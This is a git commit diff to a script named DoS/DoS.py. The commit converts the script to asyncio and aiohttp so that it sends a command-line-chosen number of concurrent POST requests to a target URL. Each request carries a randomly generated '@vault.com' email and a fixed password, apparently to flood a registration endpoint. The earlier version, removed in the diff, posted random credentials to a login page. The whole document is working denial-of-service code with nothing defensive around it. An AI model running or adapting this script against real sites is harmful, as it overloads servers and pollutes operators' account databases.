37d7fe696714a7d7b3e008f88887a1f0f3ab9b56
Vardan Asatryan <143880638+vasatryan@users.noreply.github.com>
2024-05-09 15:14:26 +0400

    change to async

--- DoS/DoS.py
+++ DoS/DoS.py
@@ -1,22 +1,40 @@
-import requests 
+import sys
+import asyncio
+import aiohttp
 import random
 import string
 
-def generate_random_string(length):
-    chars = string.ascii_letters + string.digits  
-    random_string = ''.join(random.choice(chars) for _ in range(length))
-    return random_string
+async def send_post_request(session, url, payload):
+    async with session.post(url, json=payload) as response:
+        return response
 
-def dos_attack(url, requests_count): 
-    while requests_count:
-        name = generate_random_string(10)
-        print(name)
-        pas = generate_random_string(10)
-        requests_count -= 1
-        body_data = {'username': name, 'password': pas}
-        requests.post(url, data=body_data)
-        
-url = "https://example.com/login"
-request_count = 1
+def email_gen():
+    sym = string.ascii_letters + string.digits
+    email = ''.join(random.choice(sym) for _ in range(10))
+    email += "@vault.com"
+    return email
 
-dos_attack(url, request_count) 
+async def main():
+    if len(sys.argv) != 3:
+        print("Usage: python script.py <url> <count>")
+        return
+
+    url = sys.argv[1]
+    try:
+        count = int(sys.argv[2])
+    except ValueError:
+        print("Count must be an integer.")
+        return
+
+    tasks = []
+    async with aiohttp.ClientSession() as session:
+        for _ in range(count):
+            email = email_gen()
+            print(email)
+            payload = {"email": email, "password": "ape123456", "chessLevel": 1}
+            tasks.append(asyncio.create_task(send_post_request(session, url, payload)))
+        responses = await asyncio.gather(*tasks)
+        # print(responses)  # Print all responses if needed
+
+if __name__ == "__main__":
+    asyncio.run(main())
